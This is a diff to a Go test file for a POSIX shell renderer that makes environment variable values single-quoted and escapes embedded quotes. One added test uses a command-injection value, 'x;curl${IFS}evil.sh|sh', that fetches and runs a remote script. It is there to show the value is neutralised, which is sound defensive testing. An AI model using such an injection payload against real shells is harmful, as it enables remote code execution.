@@ -22,7 +22,19 @@ var _ = Describe(renderers.ShellTypePosix, func() {
 				key := "KEY"
 				value := "value"
 				result := renderer.RenderEnvironmentVariable(key, value)
-				Expect(result).To(Equal("export KEY=value"))
+				Expect(result).To(Equal("export KEY='value'"))
+			})
+			It("shell-quotes values containing shell metacharacters", func() {
+				key := "BOSH_CLIENT_SECRET"
+				value := "x;curl${IFS}evil.sh|sh"
+				result := renderer.RenderEnvironmentVariable(key, value)
+				Expect(result).To(Equal("export BOSH_CLIENT_SECRET='x;curl${IFS}evil.sh|sh'"))
+			})
+			It("escapes embedded single quotes instead of breaking out of the quoted string", func() {
+				key := "KEY"
+				value := "it's a test"
+				result := renderer.RenderEnvironmentVariable(key, value)
+				Expect(result).To(Equal(`export KEY='it'\''s a test'`))
 			})
 		})
 		Context("WhenMultiLine", func() {
